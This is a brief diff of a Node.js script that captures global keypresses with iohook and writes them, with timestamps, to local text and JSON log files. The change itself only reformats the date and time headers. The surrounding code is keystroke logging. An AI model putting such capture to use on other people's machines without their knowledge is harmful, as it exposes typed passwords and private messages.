@@ -18,7 +18,7 @@ if (!fs.existsSync(log)) {
     fs.writeFileSync(log, "[]", "utf-8")
 }
 if (!fs.existsSync(text)) {
-    fs.writeFileSync(text, "", "utf-8")
+    fs.writeFileSync(text, `${date}/${month}/${d.getFullYear()}\n`, "utf-8")
 }
 
 let sessionText = "";
@@ -49,7 +49,7 @@ iohook.on("keypress", e => {
         let minutes = d.getMinutes() < 10 ? "0" + d.getMinutes() : d.getMinutes();
         let seconds = d.getSeconds() < 10 ? "0" + d.getSeconds() : d.getSeconds();
 
-        sessionText = `Date: ${date}-${month}-${d.getFullYear()}  Time: ${hours}-${minutes}-${seconds}\n${sessionText}\n`
+        sessionText = `- ${hours}:${minutes}:${seconds}\n${sessionText}\n`
         
         parseLogs.push({...e, time: `${d.getDate()}-${d.getMonth()}-${d.getFullYear()} ${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`})
         fs.writeFileSync(text, texts + sessionText, "utf-8")
